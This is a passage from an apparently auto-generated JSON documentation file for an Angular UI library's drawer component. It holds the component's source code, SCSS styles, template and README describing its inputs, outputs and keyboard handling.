                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "resizeContent",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 227,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "testKeyCombos",
                "args": [
                  {
                    "name": "ev",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 155,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "ev",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "testSingleKeys",
                "args": [
                  {
                    "name": "ev",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 167,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": "ev",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "toggle",
                "args": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true"
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 201,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "emit",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "true",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "style.height.vh",
            "defaultValue": "100",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 103,
            "type": "number",
            "decorators": []
          }
        ],
        "hostListeners": [
          {
            "name": "document:keydown",
            "args": [
              {
                "name": "event",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 146
          },
          {
            "name": "window:resize",
            "args": [],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 196
          }
        ],
        "description": "<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n",
        "rawdescription": "\n\nA sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectionStrategy,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  ContentChild,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostBinding,\r\n  HostListener,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { Key } from '@ngx-stoui/core';\r\nimport { StoDrawerFooterComponent } from './sto-drawer-footer.component';\r\nimport { drawerAnimations } from '../animation';\r\n\r\n/**\r\n * A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.\r\n */\r\n@Component({\r\n  selector: 'sto-drawer',\r\n  templateUrl: './sto-drawer.component.html',\r\n  styleUrls: [ './sto-drawer.component.scss', '../sto-navigation/_sto-navigation.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  animations: drawerAnimations\r\n})\r\n\r\nexport class StoDrawerComponent implements OnInit, AfterViewInit {\r\n\r\n  /**\r\n   * If the drawer is opened.\r\n   */\r\n  @Input()\r\n  @HostBinding('class.open')\r\n  get open(): boolean {\r\n    return this._open;\r\n  }\r\n\r\n  set open(open: boolean) {\r\n    this._open = open;\r\n    this.onOpen.emit(open);\r\n    this.cdr.detectChanges();\r\n  }\r\n\r\n  // @HostBinding('@drawerAnimations')\r\n  get slideInOut() {\r\n    if ( !this.animation ) {\r\n      return this.open ? 'openImmediate' : `closedImmediate-${this.position}`;\r\n    }\r\n    return this.open ? `open-${this.position}` : `closed-${this.position}`;\r\n  }\r\n\r\n  /**\r\n   * Offset (space) between the viewPanel right and the drawer in pixels\r\n   * Binds to the right style property.\r\n   * Used for multiple drawers where the offset would be the widht of the allready opened drawer.\r\n   * Default 0.\r\n   */\r\n  @Input() offset = '0';\r\n  /**\r\n   * Offset (space) between the viewPanel top and the drawer in pixels.\r\n   * Binds to the top style property.\r\n   * Default 0.\r\n   */\r\n  @Input() padding = '0px';\r\n  /**\r\n   * Position of the drawer as a string\r\n   * Left or right. Default right.\r\n   */\r\n  @Input() position: 'left' | 'right';\r\n  /**\r\n   * Additional css class(es) as a string e.g 'sto-drawer--xmas'.\r\n   */\r\n  @Input() cssClass: string;\r\n  /**\r\n   * If the drawer should close when clicked outside the drawer.\r\n   */\r\n  @Input() closeOnClick: boolean;\r\n\r\n  /**\r\n   * Esc key closed by default the drawer, this overrides that behaviour.\r\n   * Default false.\r\n   */\r\n  @Input() ignoreEscKey = false;\r\n\r\n  private _open: boolean;\r\n\r\n  /**\r\n   * The width of the drawer in as a string (pixels: '600px', presentage: '33%', or viewPort:'30vw')\r\n   * Default '25vw'\r\n   */\r\n  @Input() @HostBinding('style.width')\r\n  width = '300px';\r\n\r\n  // I don't see what harm this can do, the drawer should always be full height..\r\n  @HostBinding('style.height.vh')\r\n  h = 100;\r\n\r\n  @Input()\r\n  animation: boolean;\r\n  @Input()\r\n  backdrop: boolean;\r\n\r\n  /**\r\n   * Emits true if opened, false if closed.\r\n   *  {EventEmitter<boolean>}\r\n   */\r\n  @Output() onToggle = new EventEmitter<boolean>();\r\n  /**\r\n   * Emits on close.\r\n   */\r\n  @Output() onClose = new EventEmitter();\r\n  /**\r\n   * Emits on open.\r\n   */\r\n  @Output() onOpen = new EventEmitter();\r\n\r\n  /**\r\n   * Emits on cancel. When the cancel is called by pressing ESC key.\r\n   *  {EventEmitter<any>}\r\n   */\r\n  @Output() cancel = new EventEmitter();\r\n  /**\r\n   * Emits on submit. When the submit is called from code like CTRL+S.\r\n   *  {EventEmitter<any>}\r\n   */\r\n  @Output() submit = new EventEmitter();\r\n\r\n  public height = '100%';\r\n\r\n  @ViewChild('header') headerRef: ElementRef;\r\n  @ContentChild(StoDrawerFooterComponent, { read: ElementRef })\r\n  footer: ElementRef<HTMLElement>;\r\n\r\n  constructor(private el: ElementRef, private cdr: ChangeDetectorRef) {\r\n  }\r\n\r\n\r\n  @HostListener('document:keydown', [ '$event' ])\r\n  handleKeyboardEvent(event: KeyboardEvent) {\r\n    if ( event.ctrlKey || event.altKey || event.shiftKey ) {\r\n      this.testKeyCombos(event);\r\n    } else {\r\n      this.testSingleKeys(event);\r\n    }\r\n  }\r\n\r\n\r\n  private testKeyCombos(ev: KeyboardEvent) {\r\n    // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n    const path: HTMLElement[] = ( ev as any ).path;\r\n    // Test to ensure we have focus inside the drawer\r\n    if ( !( path && path.includes(this.el.nativeElement) ) ) {\r\n      return;\r\n    }\r\n    if ( ev.ctrlKey && ev.keyCode === Key.Enter ) {\r\n      this.submit.emit();\r\n    }\r\n  }\r\n\r\n  private testSingleKeys(ev: KeyboardEvent) {\r\n    if ( ev.keyCode !== Key.Escape || this.ignoreEscKey ) {\r\n      return;\r\n    }\r\n    const isNotInsideAMenu = !this.isAnActiveOverlayPresent();\r\n    if ( isNotInsideAMenu ) {\r\n      this.closeDrawer();\r\n      this.cancel.emit();\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\r\n   * This indicates a select-list, dialog or menu is opened.\r\n   * true if an active overlay is present in the DOM.\r\n   */\r\n  private isAnActiveOverlayPresent(): boolean {\r\n    const overlays: Array<Element> = Array.from(document.getElementsByClassName('cdk-overlay-container'))\r\n      .filter(overlay => !!overlay)\r\n      .filter(overlay => overlay.children.length > 0)\r\n      .map(overlay => Array.from(overlay.children))\r\n      .flat();\r\n    const overlaysActive = overlays\r\n      .map(el => el.innerHTML)\r\n      .filter(content => !!content || content !== '');\r\n    return overlaysActive.length !== 0;\r\n  }\r\n\r\n  @HostListener('window:resize', [ '$event' ])\r\n  onWindowResize() {\r\n    this.resizeContent();\r\n  }\r\n\r\n\r\n  public toggle(emit = true) {\r\n    if ( emit ) {\r\n      this.onToggle.emit(!this.open);\r\n    }\r\n    if ( !this.open ) {\r\n      this.openDrawer(emit);\r\n    } else {\r\n      this.closeDrawer(emit);\r\n    }\r\n  }\r\n\r\n  public closeDrawer(emit = true) {\r\n    this.open = false;\r\n    this.cdr.detectChanges();\r\n    if ( emit ) {\r\n      this.onClose.emit();\r\n    }\r\n  }\r\n\r\n  public openDrawer(emit = true) {\r\n    this.open = true;\r\n    if ( emit ) {\r\n      this.onOpen.emit();\r\n    }\r\n  }\r\n\r\n  private resizeContent() {\r\n    if ( this.open ) {\r\n      const hasFooter = this.footer;\r\n      const totalHeight: number = this.el?.nativeElement.offsetHeight;\r\n      let footerHeight = 0;\r\n\r\n      const headerHeight = this.headerRef?.nativeElement.offsetHeight;\r\n      if ( hasFooter ) {\r\n        footerHeight = this.footer?.nativeElement.offsetHeight;\r\n      }\r\n      this.height = `${totalHeight - footerHeight - headerHeight}px`;\r\n    }\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( !this.position ) {\r\n      this.position = 'left';\r\n    }\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    setTimeout(() => this.resizeContent());\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@use '@angular/material' as mat;\r\n\r\n\r\n\r\n$header-height: 74px;\r\n$large-header-height: 24 * 4px;\r\n$footer-height: 16 * 4px;\r\n$header-size: 20px;\r\n.large-header {\r\n  .sto-drawer__content {\r\n    height: calc(100% - calc(#{$large-header-height} + #{$footer-height}));\r\n  }\r\n\r\n  .sto-drawer__header {\r\n    line-height: 30px;\r\n    height: $large-header-height;\r\n  }\r\n}\r\n\r\n\r\n\r\n.sto-drawer {\r\n  transition: right 400ms ease-in-out;\r\n  @include mat.elevation(16);\r\n  position: fixed;\r\n  top: 0;\r\n  bottom: 0;\r\n  width: 20%;\r\n  min-width: 260px;\r\n  padding-top: $header-height;\r\n\r\n  &.right {\r\n    min-width: 450px;\r\n  }\r\n\r\n  z-index: 30;\r\n\r\n  &.right {\r\n    left: auto;\r\n    right: 0;\r\n  }\r\n\r\n  &.left {\r\n    left: 0;\r\n    right: auto;\r\n  }\r\n\r\n  &__content {\r\n    padding: 2 * 4px;\r\n    overflow-y: auto;\r\n    overflow-x: hidden;\r\n\r\n    &.navigation {\r\n      height: 100%;\r\n    }\r\n  }\r\n\r\n  &__footer {\r\n    @include mat.elevation(4);\r\n    position: absolute;\r\n    bottom: 0;\r\n    left: 0;\r\n    padding: 2 * 4px;\r\n    width: 100%;\r\n\r\n    height: calc(#{$footer-height} - 4 * 4px);\r\n\r\n    button {\r\n      text-transform: uppercase;\r\n    }\r\n\r\n    &__more {\r\n      float: right;\r\n    }\r\n  }\r\n\r\n  &__header {\r\n    display: flex;\r\n    align-items: center;\r\n    width: 100%;\r\n\r\n    .sto-main-icon {\r\n      height: 40px;\r\n      width: 40px;\r\n      margin: 6px 0 0 16px;\r\n    }\r\n\r\n    &__title, h1, h2, h3, h4 {\r\n      margin: 0;\r\n      padding-left: 16px;\r\n    }\r\n\r\n    &__suffix {\r\n      width: 100%;\r\n      text-align: right;\r\n      min-width: 56px;\r\n      //color: $white-87;\r\n    }\r\n\r\n    &__infix {\r\n      min-width: 56px;\r\n\r\n      //color: $white;\r\n    }\r\n\r\n    button.mat-icon-button {\r\n      margin: 0 8px;\r\n      border: 0;\r\n      outline: none;\r\n      cursor: pointer;\r\n\r\n    }\r\n\r\n    &__wrapper {\r\n      @include mat.elevation(4);\r\n      position: absolute;\r\n      top: 0;\r\n      z-index: 1;\r\n      padding: 0;\r\n      display: flex;\r\n      box-sizing: border-box;\r\n      width: 100%;\r\n      height: $header-height;\r\n      flex-direction: row;\r\n      align-items: center;\r\n      white-space: nowrap;\r\n\r\n    }\r\n  }\r\n}\r\n\r\n.large-header {\r\n  .sto-drawer {\r\n    padding-top: $large-header-height;\r\n  }\r\n}\r\n\r\n.sto-navigation{\r\n  .mat-list {\r\n    .mat-subheader {\r\n      padding: 8px;\r\n    }\r\n  }\r\n}\r\n\r\n.sto-drawer__overlay {\r\n  position: fixed;\r\n  top: 0;\r\n  height: 100vh;\r\n  width: 100vw;\r\n  z-index: 57;\r\n  opacity: 0.08;\r\n}\r\n\r\n@import \"sto-drawer-tabs.component\";\r\n",
            "styleUrl": "./sto-drawer.component.scss"
          },
          {
            "data": ".sto-drawer {\r\n  .sto-slide-panel {\r\n    margin: -8px;\r\n\r\n    .mat-list {\r\n      &.sto-navigation {\r\n\r\n        .mat-divider {\r\n          margin-top: 15px;\r\n          margin-bottom: 16px;\r\n        }\r\n\r\n        padding: 8px 0 0 0;\r\n\r\n        .mat-list-item {\r\n          padding: 0;\r\n          cursor: pointer;\r\n          font-weight: 500;\r\n\r\n          .mat-button {\r\n            @extend %list-item-properties;\r\n          }\r\n\r\n          .sto-navigation__item__text a {\r\n            text-decoration: none;\r\n            font-weight: 500;\r\n          }\r\n\r\n          .sto-navigation__suffix {\r\n            padding: 12px 0;\r\n            margin-right: 16px;\r\n            float: right;\r\n            line-height: 0;\r\n\r\n            .mat-icon {\r\n              padding: 0;\r\n              width: 24px;\r\n            }\r\n          }\r\n\r\n          .mat-list-item-content {\r\n            padding: 0;\r\n          }\r\n\r\n          .mat-icon {\r\n            padding: 0px 32px 0px 16px;\r\n            line-height: 24px;\r\n\r\n            svg {\r\n              opacity: 0.54;\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    .sto-navigation__backdrop {\r\n      position: fixed;\r\n      top: 0;\r\n      right: 0;\r\n      bottom: 0;\r\n      left: 0;\r\n      transition: opacity 0.4s ease-in-out;;\r\n      transform: translate(0);\r\n      opacity: 0.25;\r\n      cursor: pointer;\r\n      background: black;\r\n      z-index: 59;\r\n    }\r\n\r\n    .sto-navigation__backdrop--hidden {\r\n      transform: translate(9999px);\r\n      opacity: 0;\r\n    }\r\n\r\n    // dropdown\r\n    .mat-list.sto-navigation {\r\n\r\n      .mat-expansion-panel.sto-navigation__dropdown {\r\n        box-shadow: none;\r\n        background-color: transparent;\r\n      }\r\n\r\n      .mat-expansion-panel-header.sto-navigation__dropdown__header {\r\n        padding: 0;\r\n      }\r\n\r\n      .mat-expansion-panel-header-title.sto-navigation__dropdown__title {\r\n        @extend %list-item-properties;\r\n      }\r\n\r\n      .mat-expansion-indicator {\r\n        margin-right: 24px;\r\n        float: right;\r\n        line-height: 0;\r\n\r\n        &:after {\r\n          padding: 4px;\r\n        }\r\n      }\r\n\r\n      .mat-expansion-panel-body {\r\n        padding: 0;\r\n\r\n        .sto-navigation__item__text {\r\n          padding-left: 16px;\r\n          font-weight: normal;\r\n        }\r\n      }\r\n\r\n      .sto-navigation__prefix {\r\n        display: inline-block;\r\n        padding: 12px 35px 0 16px;\r\n        line-height: 0;\r\n      }\r\n    }\r\n\r\n    .mat-list.sto-list__navigation {\r\n      padding-top: 0;\r\n      margin: 0 2px;\r\n\r\n      .mat-subheader {\r\n        padding: 0 4px;\r\n      }\r\n\r\n      .mat-list-item {\r\n        border-top-left-radius: 4px;\r\n        border-top-right-radius: 4px;\r\n      }\r\n    }\r\n\r\n    .mat-icon-button.sto-list__navigation__button {\r\n\r\n      &:hover {\r\n      }\r\n    }\r\n\r\n  }\r\n}\r\n\r\n%list-item-properties {\r\n  width: 100%;\r\n  text-transform: none;\r\n  text-align: left;\r\n  padding: 0;\r\n  margin: 0;\r\n  line-height: 48px;\r\n  cursor: pointer;\r\n}\r\n",
            "styleUrl": "../sto-navigation/_sto-navigation.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "el",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 139,
          "jsdoctags": [
            {
              "name": "el",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "AfterViewInit"
        ],
        "accessors": {
          "open": {
            "name": "open",
            "setSignature": {
              "name": "open",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "open",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 45,
              "jsdoctags": [
                {
                  "name": "open",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "open",
              "type": "boolean",
              "returnType": "boolean",
              "line": 41,
              "rawdescription": "\n\nIf the drawer is opened.\n",
              "description": "<p>If the drawer is opened.</p>\n"
            }
          },
          "slideInOut": {
            "name": "slideInOut",
            "getSignature": {
              "name": "slideInOut",
              "type": "",
              "returnType": "",
              "line": 52
            }
          }
        },
        "readme": "<h3 id=\"sto-drawer\">Sto Drawer</h3>\n<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n<p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-header\">sto-filter-header</h5>\n<p>Content (HTML) that is inside the header of the drawer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-header&gt;\n        &lt;h3&gt;Price&lt;/h3&gt;\n        &lt;div class=&quot;sto-drawer__header__suffix&quot;&gt;\n            &lt;button type=&quot;button&quot;\n                    mat-icon-button\n                    (click)=&quot;cancel()&quot;&gt;\n                &lt;mat-icon&gt;close&lt;/mat-icon&gt;\n            &lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/sto-drawer-header&gt;</code></pre></div><h5 id=\"sto-drawer__footer\">sto-drawer__footer</h5>\n<p>Content (HTML) that is inside the header footer.  </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer&gt;\n        &lt;mat-progress-bar class=&quot;sto-progress-bar&quot; mode=&quot;indeterminate&quot; *ngIf=&quot;!hasData || (isLoading$ | async)&quot;&gt;&lt;/mat-progress-bar&gt;\n        &lt;button mat-raised-button (click)=&quot;save()&quot; color=&quot;primary&quot;&gt;Save&lt;/button&gt;\n        &lt;button mat-button (click)=&quot;cancel(true)&quot; color=&quot;primary&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-drawer-footer&gt;</code></pre></div><p>####Input </p>\n<h5 id=\"offset\">offset</h5>\n<p>Offset (space) between the viewPanel right and the drawer in pixels. Binds to the right style property.\nUsed for multiple drawers where the offset would be the width of the already opened drawer.\nDefault 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer offset=&quot;32px&quot;&gt;</code></pre></div><h5 id=\"padding\">padding</h5>\n<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\n Default 0.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer padding=&quot;16px&quot;&gt;</code></pre></div><h5 id=\"position\">position</h5>\n<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer position=&quot;left&quot;&gt;</code></pre></div><h5 id=\"cssclass\">cssClass</h5>\n<p>Additional css class(es) as a string e.g &quot;sto-drawer--xmas&quot;.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer cssClass=&quot;sto-drawer--xmas&quot;&gt;</code></pre></div><h5 id=\"closeonclick\">closeOnClick</h5>\n<p>If the drawer should close when clicked outside the drawer.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [closeOnClick]=&quot;false&quot;&gt;</code></pre></div><h5 id=\"ignoreesckey\">ignoreEscKey</h5>\n<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [ignoreEscKey]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"open\">open</h5>\n<p>If the drawer is opened.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer [open]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"width\">width</h5>\n<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer width=&quot;320px&quot;&gt;</code></pre></div><p>####Output </p>\n<h5 id=\"ontoggle\">onToggle</h5>\n<p>Emits true if opened, false if closed.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onToggle)=&quot;onToggle($event)&quot;&gt;</code></pre></div><h5 id=\"onclose\">onClose</h5>\n<p>Emits on close.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onClose)=&quot;onClose()&quot;&gt;</code></pre></div><h5 id=\"onopen\">onOpen</h5>\n<p>Emits on open.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (onOpen)=&quot;onOpen()&quot;&gt;</code></pre></div><h5 id=\"cancel\">cancel</h5>\n<p>Emits on cancel. When the cancel is called by pressing ESC key.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (cancel)=&quot;onCancel()&quot;&gt;</code></pre></div><h5 id=\"submit\">submit</h5>\n<p>Emits on submit. When the submit is called from code like CTRL+S.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-drawer-footer (submit)=&quot;onSubmit()&quot;&gt;</code></pre></div>",
        "templateData": "<div\r\n  [ngClass]=\"position + ' ' + cssClass\"\r\n  [style.width]=\"width\"\r\n  [style.top]=\"padding\"\r\n  [style.zIndex]=\"position === 'left' ? 60 : 58\"\r\n  [style.right]=\"offset\"\r\n  [@drawerAnimations]=\"slideInOut\"\r\n  class=\"sto-drawer\">\r\n  <div class=\"sto-drawer__header__wrapper\"\r\n       #header>\r\n    <ng-content select=\"sto-drawer-header\">\r\n    </ng-content>\r\n  </div>\r\n  <div [class.navigation]=\"!header\"\r\n       [style.height]=\"height\"\r\n       class=\"sto-drawer__content\">\r\n    <ng-content></ng-content>\r\n  </div>\r\n\r\n  <div class=\"sto-drawer__footer\"\r\n       [style.display]=\"footer ? 'inherit' : 'none'\"\r\n       #footerEl>\r\n    <ng-content select=\"sto-drawer-footer\"></ng-content>\r\n  </div>\r\n\r\n</div>\r\n\r\n<div @overlay\r\n     class=\"sto-drawer__overlay\"\r\n     [style.left]=\"0\"\r\n     *ngIf=\"open && animation && backdrop\"\r\n     (click)=\"closeDrawer()\"></div>\r\n"
      },
      {
        "name": "StoDrawerFooterComponent",
        "id": "component-StoDrawerFooterComponent-b9bfd932c6902f2e0cce943def821699824db21cfc0ac68d53b836f89192e1aff3ef7837df6c4ec963607677bef637210ca48b571f2a9f23b46a13673ec3c90c",
        "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-drawer-footer",
        "styleUrls": [],
        "styles": [],
        "template": "<ng-content></ng-content>",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-drawer-footer',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDrawerFooterComponent {\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": ""
      },
      {
        "name": "StoDrawerHeaderComponent",
        "id": "component-StoDrawerHeaderComponent-aee88c157d9e459ce48c923d97a05b2e6bf5d07f21fee4316a360df2b1eba393b61e14c9d8d16c31a827aec2a1a69140aa2df3d4565237b1c4aabc4d846ed734",
        "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-drawer-header",
        "styleUrls": [
          "./sto-drawer.component.scss"
        ],
        "styles": [],
        "template": "<ng-content></ng-content>",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "class",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 10,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-drawer__header'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-drawer__header",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 10,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, HostBinding } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-drawer-header',\r\n  template: `\r\n    <ng-content></ng-content>`,\r\n  styleUrls: [ './sto-drawer.component.scss' ]\r\n})\r\nexport class StoDrawerHeaderComponent {\r\n  @HostBinding('class.sto-drawer__header') class = true;\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@use '@angular/material' as mat;\r\n\r\n\r\n\r\n$header-height: 74px;\r\n$large-header-height: 24 * 4px;\r\n$footer-height: 16 * 4px;\r\n$header-size: 20px;\r\n.large-header {\r\n  .sto-drawer__content {\r\n    height: calc(100% - calc(#{$large-header-height} + #{$footer-height}));\r\n  }\r\n\r\n  .sto-drawer__header {\r\n    line-height: 30px;\r\n    height: $large-header-height;\r\n  }\r\n}\r\n\r\n\r\n\r\n.sto-drawer {\r\n  transition: right 400ms ease-in-out;\r\n  @include mat.elevation(16);\r\n  position: fixed;\r\n  top: 0;\r\n  bottom: 0;\r\n  width: 20%;\r\n  min-width: 260px;\r\n  padding-top: $header-height;\r\n\r\n  &.right {\r\n    min-width: 450px;\r\n  }\r\n\r\n  z-index: 30;\r\n\r\n  &.right {\r\n    left: auto;\r\n    right: 0;\r\n  }\r\n\r\n  &.left {\r\n    left: 0;\r\n    right: auto;\r\n  }\r\n\r\n  &__content {\r\n    padding: 2 * 4px;\r\n    overflow-y: auto;\r\n    overflow-x: hidden;\r\n\r\n    &.navigation {\r\n      height: 100%;\r\n    }\r\n  }\r\n\r\n  &__footer {\r\n    @include mat.elevation(4);\r\n    position: absolute;\r\n    bottom: 0;\r\n    left: 0;\r\n    padding: 2 * 4px;\r\n    width: 100%;\r\n\r\n    height: calc(#{$footer-height} - 4 * 4px);\r\n\r\n    button {\r\n      text-transform: uppercase;\r\n    }\r\n\r\n    &__more {\r\n      float: right;\r\n    }\r\n  }\r\n\r\n  &__header {\r\n    display: flex;\r\n    align-items: center;\r\n    width: 100%;\r\n\r\n    .sto-main-icon {\r\n      height: 40px;\r\n      width: 40px;\r\n      margin: 6px 0 0 16px;\r\n    }\r\n\r\n    &__title, h1, h2, h3, h4 {\r\n      margin: 0;\r\n      padding-left: 16px;\r\n    }\r\n\r\n    &__suffix {\r\n      width: 100%;\r\n      text-align: right;\r\n      min-width: 56px;\r\n      //color: $white-87;\r\n    }\r\n\r\n    &__infix {\r\n      min-width: 56px;\r\n\r\n      //color: $white;\r\n    }\r\n\r\n    button.mat-icon-button {\r\n      margin: 0 8px;\r\n      border: 0;\r\n      outline: none;\r\n      cursor: pointer;\r\n\r\n    }\r\n\r\n    &__wrapper {\r\n      @include mat.elevation(4);\r\n      position: absolute;\r\n      top: 0;\r\n      z-index: 1;\r\n      padding: 0;\r\n      display: flex;\r\n      box-sizing: border-box;\r\n      width: 100%;\r\n      height: $header-height;\r\n      flex-direction: row;\r\n      align-items: center;\r\n      white-space: nowrap;\r\n\r\n    }\r\n  }\r\n}\r\n\r\n.large-header {\r\n  .sto-drawer {\r\n    padding-top: $large-header-height;\r\n  }\r\n}\r\n\r\n.sto-navigation{\r\n  .mat-list {\r\n    .mat-subheader {\r\n      padding: 8px;\r\n    }\r\n  }\r\n}\r\n\r\n.sto-drawer__overlay {\r\n  position: fixed;\r\n  top: 0;\r\n  height: 100vh;\r\n  width: 100vw;\r\n  z-index: 57;\r\n  opacity: 0.08;\r\n}\r\n\r\n@import \"sto-drawer-tabs.component\";\r\n",
            "styleUrl": "./sto-drawer.component.scss"
          }
        ],
        "stylesData": ""
      },
      {
        "name": "StoDrawerWrapperComponent",
